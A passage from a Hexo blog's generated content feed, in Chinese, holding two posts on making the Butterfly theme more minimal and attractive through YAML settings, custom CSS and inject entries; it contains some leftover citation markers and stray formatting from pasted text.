片段，最值得先动手的有：</p><ol><li><strong>顶部大图过强</strong>：你几乎所有页面都用同一张 <code>background2.jpg</code>，视觉占比很高  </li><li><strong>首页字幕打字机</strong>：动效会抢注意力（你追求内容优先）  </li><li><strong>外链特效脚本</strong>：<code>jquery + fishes.js</code> 属于“装饰性强、功能性弱”，且会增加不稳定因素  </li><li><strong>首页摘要 500 字太长</strong>：内容密度过大，浏览成本更高  </li><li><strong>侧边栏卡片偏多</strong>：可以保留功能，但需要“减法”和“更合理的排序”</li></ol><hr><h2 id="3-推荐的整体策略（最少改动，效果最大）"><a href="#3-推荐的整体策略（最少改动，效果最大）" class="headerlink" title="3. 推荐的整体策略（最少改动，效果最大）"></a>3. 推荐的整体策略（最少改动，效果最大）</h2><h3 id="3-1-顶部大图策略：弱化-只在首页保留"><a href="#3-1-顶部大图策略：弱化-只在首页保留" class="headerlink" title="3.1 顶部大图策略：弱化 / 只在首页保留"></a>3.1 顶部大图策略：弱化 / 只在首页保留</h3><p>极简风里，<strong>顶部图可以有，但不要处处都是同一张大背景</strong>：</p><ul><li>首页：可以保留一张轻量、低对比的图（或渐变色）</li><li>文章页：建议 <strong>关闭 top_img</strong>（阅读更聚焦）</li><li>分类/标签/归档页：可使用纯色/渐变，降低视觉噪音</li></ul><p><strong>推荐做法 A：全站关闭 top_img（最极简）</strong></p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">disable_top_img:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">````</span></span><br><span class="line"></span><br><span class="line"><span class="string">**推荐做法</span> <span class="string">B：保留首页，文章页关闭（折中）**</span></span><br><span class="line"></span><br><span class="line"><span class="string">*</span> <span class="string">主题配置保留</span> <span class="string">`index_img`</span></span><br><span class="line"><span class="string">*</span> <span class="string">在文章</span> <span class="string">Front-matter</span> <span class="string">里写：</span></span><br><span class="line"></span><br><span class="line"><span class="string">```yml</span></span><br><span class="line"><span class="attr">top_img:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>你如果担心逐篇加很麻烦：可以写一个“默认规则”，以后新文章模板里就带 <code>top_img: false</code>（详见第 7 节）。</p></blockquote><hr><h2 id="4-一份“极简取向”的关键配置（可直接改）"><a href="#4-一份“极简取向”的关键配置（可直接改）" class="headerlink" title="4. 一份“极简取向”的关键配置（可直接改）"></a>4. 一份“极简取向”的关键配置（可直接改）</h2><p>下面是一组“建议值”。你不需要一次全改完，按顺序做即可。</p><h3 id="4-1-导航栏：固定-简洁（功能性更强）"><a href="#4-1-导航栏：固定-简洁（功能性更强）" class="headerlink" title="4.1 导航栏：固定 + 简洁（功能性更强）"></a>4.1 导航栏：固定 + 简洁（功能性更强）</h3><p>你目前 <code>nav.fixed: false</code>。极简站点更强调可用性，建议改成固定：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><p>菜单建议保留你现有结构，但可以考虑：</p><ul><li>“生活”下的内容如果访问率不高，隐藏到二级页或减少入口</li><li>“留言板 / 关于”保留</li><li>把“搜索”入口放到明显位置（你已经启用 local_search）</li></ul><hr><h3 id="4-2-首页：减少信息噪音（摘要更短、布局更稳定）"><a href="#4-2-首页：减少信息噪音（摘要更短、布局更稳定）" class="headerlink" title="4.2 首页：减少信息噪音（摘要更短、布局更稳定）"></a>4.2 首页：减少信息噪音（摘要更短、布局更稳定）</h3><p>你当前：</p><ul><li><code>index_layout: 3</code>（左右交错）</li><li><code>index_post_content.length: 500</code>（太长）</li></ul><p>极简更推荐“稳定、规律”的布局与更短摘要：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">index_layout:</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="attr">index_post_content:</span></span><br><span class="line">  <span class="attr">method:</span> <span class="number">2</span>      <span class="comment"># 优先 description，没有就用自动摘要</span></span><br><span class="line">  <span class="attr">length:</span> <span class="number">180</span>    <span class="comment"># 120~220 都可以，看你文章风格</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>小技巧：重要文章手动写 <code>description</code>，首页展示会更精致、更可控。</p></blockquote><hr><h3 id="4-3-首页字幕：建议改为静态（减少注意力抢夺）"><a href="#4-3-首页字幕：建议改为静态（减少注意力抢夺）" class="headerlink" title="4.3 首页字幕：建议改为静态（减少注意力抢夺）"></a>4.3 首页字幕：建议改为静态（减少注意力抢夺）</h3><p>你目前打字机效果开启且循环。极简风建议关闭动效，只保留一句静态副标题：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">subtitle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">source:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">sub:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">"写清楚，比写热闹更重要"</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="4-4-右下角按钮：保留功能，但更“干净”"><a href="#4-4-右下角按钮：保留功能，但更“干净”" class="headerlink" title="4.4 右下角按钮：保留功能，但更“干净”"></a>4.4 右下角按钮：保留功能，但更“干净”</h3><p>你已经开启 readmode、darkmode（很实用）。建议：</p><ul><li>关闭滚动百分比（你目前就是 false）</li><li>保留 <code>darkmode.button: true</code> 很好</li><li><code>rightside_config_animation</code> 若你想更克制，可设为 false</li></ul><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">rightside_config_animation:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="4-5-侧边栏：保留核心功能，删掉“可有可无”"><a href="#4-5-侧边栏：保留核心功能，删掉“可有可无”" class="headerlink" title="4.5 侧边栏：保留核心功能，删掉“可有可无”"></a>4.5 侧边栏：保留核心功能，删掉“可有可无”</h3><p>你现在 aside 卡片比较全。极简建议保留：</p><ul><li>作者信息（card_author）</li><li>公告（可以更短）</li><li>最近文章（limit 5）</li><li>分类（limit 8）</li><li>标签（建议改为 20~30 且按 name 或 length）</li><li>归档（limit 6~8）</li><li>站点信息（可选：PV/UV 对极简站点可能偏“噪音”）</li></ul><p>建议调整为：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">archive:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">tag:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">category:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_announcement:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">"内容较杂，建议使用搜索。"</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_recent_post:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_tags:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">25</span></span><br><span class="line">    <span class="attr">color:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">orderby:</span> <span class="string">name</span></span><br><span class="line">    <span class="attr">order:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_archives:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_webinfo:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="4-6-访问统计：极简风建议默认关闭（隐私-噪音）"><a href="#4-6-访问统计：极简风建议默认关闭（隐私-噪音）" class="headerlink" title="4.6 访问统计：极简风建议默认关闭（隐私 &amp; 噪音）"></a>4.6 访问统计：极简风建议默认关闭（隐私 &amp; 噪音）</h3><p>你现在启用了 busuanzi 的 UV/PV。极简取向常见做法是关闭：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi:</span></span><br><span class="line">  <span class="attr">site_uv:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">site_pv:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">page_pv:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="4-7-外链特效脚本：建议移除（稳定性-简洁）"><a href="#4-7-外链特效脚本：建议移除（稳定性-简洁）" class="headerlink" title="4.7 外链特效脚本：建议移除（稳定性 + 简洁）"></a>4.7 外链特效脚本：建议移除（稳定性 + 简洁）</h3><p>你当前注入：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>极简方案：<strong>删掉</strong>这些装饰脚本，只保留你真正需要的 CSS/JS。</p><p>建议只保留自定义样式注入：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel="stylesheet"</span> <span class="string">href="/css/custom.css"&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="5-极简风“质感核心”：自定义-CSS（建议直接抄）"><a href="#5-极简风“质感核心”：自定义-CSS（建议直接抄）" class="headerlink" title="5. 极简风“质感核心”：自定义 CSS（建议直接抄）"></a>5. 极简风“质感核心”：自定义 CSS（建议直接抄）</h2><p>在 <code>source/css/custom.css</code> 新建并写入：</p><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* ===== 极简阅读体验：整体排版 ===== */</span></span><br><span class="line"><span class="selector-pseudo">:root</span> {</span><br><span class="line">  <span class="attr">--global-font-size</span>: <span class="number">16px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正文宽度与行距：让内容更耐读 */</span></span><br><span class="line"><span class="selector-class">.post-content</span> {</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.9</span>;</span><br><span class="line">  <span class="attribute">letter-spacing</span>: <span class="number">0.2px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 标题间距：更像“编辑排版” */</span></span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">h1</span>,</span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">h2</span>,</span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">h3</span> {</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">1.6em</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">0.8em</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 段落间距：减少拥挤感 */</span></span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">p</span> {</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0.9em</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 卡片阴影：更克制（减少“花”感） */</span></span><br><span class="line"><span class="selector-class">.card-widget</span>,</span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span> {</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">26px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">06</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">14px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 图片：统一圆角 + 轻阴影（增强质感但不过分） */</span></span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">img</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">24px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">10</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 引用：更“文本化”，减少强烈色块 */</span></span><br><span class="line"><span class="selector-tag">blockquote</span> {</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">3px</span> solid <span class="built_in">rgba</span>(<span class="number">120</span>,<span class="number">120</span>,<span class="number">120</span>,.<span class="number">35</span>);</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">120</span>,<span class="number">120</span>,<span class="number">120</span>,.<span class="number">06</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 代码块：更像“文档”，不强调花哨 */</span></span><br><span class="line"><span class="selector-tag">figure</span><span class="selector-class">.highlight</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>并在 <code>_config.butterfly.yml</code> 注入：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel="stylesheet"</span> <span class="string">href="/css/custom.css"&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="6-评论系统的“极简建议”（可选）"><a href="#6-评论系统的“极简建议”（可选）" class="headerlink" title="6. 评论系统的“极简建议”（可选）"></a>6. 评论系统的“极简建议”（可选）</h2><p>你现在用 Valine，能用，但如果你希望：</p><ul><li>更少后端维护</li><li>更符合 GitHub 技术社区习惯</li><li>更简洁一致</li></ul><p>可以考虑换 <strong>Giscus</strong>（基于 GitHub Discussions）。<br>如果继续 Valine 也可以，极简站点的关键是：<strong>评论区样式克制 + 懒加载（可选）</strong>。</p><hr><h2 id="7-让“文章页默认无头图”：从根源解决（推荐）"><a href="#7-让“文章页默认无头图”：从根源解决（推荐）" class="headerlink" title="7. 让“文章页默认无头图”：从根源解决（推荐）"></a>7. 让“文章页默认无头图”：从根源解决（推荐）</h2><p>如果你采用“首页保留头图、文章页关闭头图”的折中方案：</p><h3 id="7-1-新文章模板里默认带上-top-img-false"><a href="#7-1-新文章模板里默认带上-top-img-false" class="headerlink" title="7.1 新文章模板里默认带上 top_img: false"></a>7.1 新文章模板里默认带上 top_img: false</h3><p>你可以在 <code>scaffolds/post.md</code>（或你使用的 scaffold）里加上：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">top_img:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><p>这样以后每篇新文章天生就是极简阅读模式。</p><hr><h2 id="8-实操顺序（照着做，不容易崩）"><a href="#8-实操顺序（照着做，不容易崩）" class="headerlink" title="8. 实操顺序（照着做，不容易崩）"></a>8. 实操顺序（照着做，不容易崩）</h2><ol><li>先改首页摘要与字幕（立刻见效）</li><li>再弱化/关闭文章页头图（阅读质感直接提升）</li><li>删除 fishes.js + jQuery（稳定性 + 极简一致性）</li><li>侧边栏做减法（保留：搜索/分类/归档/最近文章）</li><li>加上 custom.css 微调排版（最后打磨质感）</li></ol><hr><h2 id="9-部署流程（备忘）"><a href="#9-部署流程（备忘）" class="headerlink" title="9. 部署流程（备忘）"></a>9. 部署流程（备忘）</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="结语：极简不是“少”，而是“恰好”"><a href="#结语：极简不是“少”，而是“恰好”" class="headerlink" title="结语：极简不是“少”，而是“恰好”"></a>结语：极简不是“少”，而是“恰好”</h2><p>当你把“头图、动效、噪音”拿掉之后，读者会更愿意：</p><ul><li>停下来读完一篇文章</li><li>用搜索去翻你写过的内容</li><li>关注你在写什么，而不是你在“怎么装饰”</li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客日常维护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主题美化教程</title>
      <link href="/2026/01/29/%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/"/>
      <url>/2026/01/29/%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-Butterfly-主题美化教程"><a href="#Hexo-Butterfly-主题美化教程" class="headerlink" title="Hexo Butterfly 主题美化教程"></a>Hexo Butterfly 主题美化教程</h1><blockquote><p>适用对象：已经用 Hexo 搭好博客，并使用 <strong>Butterfly</strong> 主题，想把站点“变好看 + 更好用 + 更顺手维护”。  </p><p>说明：Butterfly 的配置项很多，本文按「<strong>最常改、最影响观感、最容易踩坑</strong>」的顺序整理，并给出可直接抄用的配置片段。<br>参考资料主要来自 Butterfly 官方文档与主题仓库，以及若干配置/美化实践文章。:contentReference[oaicite:0]{index=0}</p></blockquote><hr><h2 id="0-美化前的原则（强烈建议先看）"><a href="#0-美化前的原则（强烈建议先看）" class="headerlink" title="0. 美化前的原则（强烈建议先看）"></a>0. 美化前的原则（强烈建议先看）</h2><ol><li><strong>站点配置与主题配置分离</strong>：把主题的 <code>_config.yml</code> 复制到根目录并命名 <code>_config.butterfly.yml</code>，之后只改这个文件，升级主题更省心。:contentReference[oaicite:1]{index=1}  </li><li><strong>自定义样式不要魔改主题源码</strong>：优先走 <code>inject</code> 注入自定义 CSS/JS；确实需要改源码时再动。:contentReference[oaicite:2]{index=2}  </li><li><strong>每次改完都要本地预览</strong>：<code>hexo s</code> 看效果，确认无误再 <code>hexo d -g</code>。</li></ol><hr><h2 id="1-推荐的目录结构（让后期维护更舒服）"><a href="#1-推荐的目录结构（让后期维护更舒服）" class="headerlink" title="1. 推荐的目录结构（让后期维护更舒服）"></a>1. 推荐的目录结构（让后期维护更舒服）</h2><p>在 Hexo 根目录建议这样组织：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line">.</span><br><span class="line">├─ _config.yml                 # 站点配置（标题、作者、URL、部署等）</span><br><span class="line">├─ _config.butterfly.yml       # 主题配置（美化主要都在这）</span><br><span class="line">├─ source/</span><br><span class="line">│  ├─ _posts/                  # 文章</span><br><span class="line">│  ├─ about/                   # 页面</span><br><span class="line">│  ├─ css/</span><br><span class="line">│  │  └─ custom.css            # 自定义样式（推荐）</span><br><span class="line">│  └─ js/</span><br><span class="line">│     └─ custom.js             # 自定义脚本（推荐）</span><br><span class="line">└─ themes/</span><br><span class="line">└─ butterfly/               # 主题本体（尽量少改）</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>Butterfly 官方也建议使用 <code>_config.butterfly.yml</code> 来降低升级成本。:contentReference[oaicite:3]{index=3}</p></blockquote><hr><h2 id="2-快速美化第一步：注入自定义-CSS-JS（最常用）"><a href="#2-快速美化第一步：注入自定义-CSS-JS（最常用）" class="headerlink" title="2. 快速美化第一步：注入自定义 CSS/JS（最常用）"></a>2. 快速美化第一步：注入自定义 CSS/JS（最常用）</h2><p>Butterfly 支持 <code>inject</code> 注入外部文件（不改源码也能“魔改”）。:contentReference[oaicite:4]{index=4}</p><h3 id="2-1-在-source-css-custom-css-写样式"><a href="#2-1-在-source-css-custom-css-写样式" class="headerlink" title="2.1 在 source/css/custom.css 写样式"></a>2.1 在 <code>source/css/custom.css</code> 写样式</h3><p>新建文件：<code>source/css/custom.css</code></p><p>示例（先给你一套“常用观感提升”模板，后面会继续加）：</p><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* ===== 全局：字体与排版微调（按需改） ===== */</span></span><br><span class="line"><span class="selector-pseudo">:root</span> {</span><br><span class="line">  <span class="attr">--global-font-size</span>: <span class="number">16px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文章内容宽度 &amp; 行高（阅读更舒服） */</span></span><br><span class="line"><span class="selector-class">.post-content</span> {</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.85</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 卡片阴影更柔和（更“现代”一点） */</span></span><br><span class="line"><span class="selector-class">.card-widget</span>,</span><br><span class="line"><span class="selector-class">.layout</span> &gt; <span class="selector-tag">div</span><span class="selector-pseudo">:first-child</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.recent-posts</span>),</span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span> {</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">30px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">08</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 图片圆角（更统一） */</span></span><br><span class="line"><span class="selector-tag">img</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="2-2-在-config-butterfly-yml-注入"><a href="#2-2-在-config-butterfly-yml-注入" class="headerlink" title="2.2 在 _config.butterfly.yml 注入"></a>2.2 在 <code>_config.butterfly.yml</code> 注入</h3><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel="stylesheet"</span> <span class="string">href="/css/custom.css"&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src="/js/custom.js"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>inject</code> 的思路与注意事项可以参考一些进阶美化文章（尤其是引入外部文件与 JS 的位置）。(<a href="https://www.cnblogs.com/thinkgone/p/16348996.html?utm_source=chatgpt.com" title="Butterfly主题美化进阶 - ThinkGone - 博客园">博客园</a>)</p></blockquote><hr><h2 id="3-站点“第一眼”美化：主页头图-背景-暗色模式"><a href="#3-站点“第一眼”美化：主页头图-背景-暗色模式" class="headerlink" title="3. 站点“第一眼”美化：主页头图 / 背景 / 暗色模式"></a>3. 站点“第一眼”美化：主页头图 / 背景 / 暗色模式</h2><blockquote><p>Butterfly 版本与配置会迭代，建议随时对照官方文档对应章节。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p></blockquote><h3 id="3-1-头图（page-header-cover）与站点背景"><a href="#3-1-头图（page-header-cover）与站点背景" class="headerlink" title="3.1 头图（page header / cover）与站点背景"></a>3.1 头图（page header / cover）与站点背景</h3><p>通常你会在主题配置里找到与 <strong>头图、背景、封面</strong> 相关的配置项（例如全局默认头图、各页面头图、是否显示/透明等）。</p><p>你可以做的美化方向：</p><ul><li>选一张高质量、风格统一的头图（建议 1920×1080 或更大）</li><li>主页头图 + 文章页头图可分开（更有层次）</li><li>背景建议：纯色 / 微纹理 / 浅渐变（花图做背景会影响阅读）</li></ul><p><strong>一个常见的“清爽感”技巧：让页脚和头图更通透</strong>（示例来自社区魔改实践）(<a href="https://blog.codejerry.cn/posts/hexomogai/index.html?utm_source=chatgpt.com" title="hexo-butterfly魔改美化 | Yan Zhang's blog">Yan Zhang’s blog</a>)</p><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* 页脚与头图透明（按主题实际结构可调整） */</span></span><br><span class="line"><span class="selector-id">#footer</span> {</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#page-header</span> {</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="3-2-暗色模式（Dark-Mode）"><a href="#3-2-暗色模式（Dark-Mode）" class="headerlink" title="3.2 暗色模式（Dark Mode）"></a>3.2 暗色模式（Dark Mode）</h3><p>暗色模式非常“加分”，也能提升夜间阅读体验。Butterfly 自带相关能力（一般在配置里开关/策略）。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p><p>美化建议：</p><ul><li>暗色下减少纯黑，偏深灰更舒适</li><li>链接、代码块颜色要保证对比度</li><li>图片可加轻微边框/阴影避免“融进背景”</li></ul><hr><h2 id="4-导航栏与菜单：让访客更愿意逛"><a href="#4-导航栏与菜单：让访客更愿意逛" class="headerlink" title="4. 导航栏与菜单：让访客更愿意逛"></a>4. 导航栏与菜单：让访客更愿意逛</h2><p>你大概率会改的：</p><ul><li>菜单结构（主页/归档/分类/标签/友链/关于）</li><li>图标（Font Awesome）</li><li>二级菜单（生活/相册/项目等）</li></ul><p>社区常见写法示例（可按你站点路径改）：(<a href="https://blog.csdn.net/mjh1667002013/article/details/129290903?utm_source=chatgpt.com" title="【Hexo】Hexo搭建Butterfly主题并快速美化 - CSDN博客">CSDN博客</a>)</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">主页:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">归档:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="string">分类:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="string">标签:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="string">友链:</span> <span class="string">/links/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-link</span></span><br><span class="line">  <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-heart</span></span><br></pre></td></tr></tbody></table></figure><p><strong>建议</strong></p><ul><li>菜单不要太长：6~8 个足够</li><li>把高频入口放前面（文章、归档、分类、标签）</li><li>“关于/友链/留言”放后面</li></ul><hr><h2 id="5-主页文章卡片：卡片风格、摘要、封面图（质感核心）"><a href="#5-主页文章卡片：卡片风格、摘要、封面图（质感核心）" class="headerlink" title="5. 主页文章卡片：卡片风格、摘要、封面图（质感核心）"></a>5. 主页文章卡片：卡片风格、摘要、封面图（质感核心）</h2><p>Butterfly 的卡片 UI 是它的亮点之一。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p><h3 id="5-1-文章封面图（Cover）"><a href="#5-1-文章封面图（Cover）" class="headerlink" title="5.1 文章封面图（Cover）"></a>5.1 文章封面图（Cover）</h3><p>建议你为每篇文章设置封面图（统一风格）：</p><ul><li>统一比例：16:9 或 4:3</li><li>同一主题系列文章可用相似风格图</li><li>图源建议：自己做/摄影/免费版权站（注意版权）</li></ul><h3 id="5-2-摘要策略"><a href="#5-2-摘要策略" class="headerlink" title="5.2 摘要策略"></a>5.2 摘要策略</h3><p>摘要可选：</p><ul><li>自动截取（省事）</li><li>在文章里手动 <code>&lt;!-- more --&gt;</code>（更可控）</li><li>首页只显示标题+少量摘要（更干净）</li></ul><p>推荐：重要文章用 <code>&lt;!-- more --&gt;</code>，日常记录自动截取。</p><hr><h2 id="6-侧边栏与个人信息：头像、简介、社交链接"><a href="#6-侧边栏与个人信息：头像、简介、社交链接" class="headerlink" title="6. 侧边栏与个人信息：头像、简介、社交链接"></a>6. 侧边栏与个人信息：头像、简介、社交链接</h2><p>侧边栏是“个人名片”，建议：</p><ul><li>头像：高清、统一风格</li><li>简介：一句话说明你写什么（技术 / 生活 / 读书 / 项目）</li><li>社交：GitHub、邮箱、B 站等（别堆太多）</li></ul><p>你可以把站点固定信息放 <code>_config.yml</code>，主题展示相关放 <code>_config.butterfly.yml</code>（官方/社区都提倡这样分离）。(<a href="https://blog.csdn.net/mjh1667002013/article/details/129290903?utm_source=chatgpt.com" title="【Hexo】Hexo搭建Butterfly主题并快速美化 - CSDN博客">CSDN博客</a>)</p><hr><h2 id="7-代码块与高亮：技术博客观感的关键"><a href="#7-代码块与高亮：技术博客观感的关键" class="headerlink" title="7. 代码块与高亮：技术博客观感的关键"></a>7. 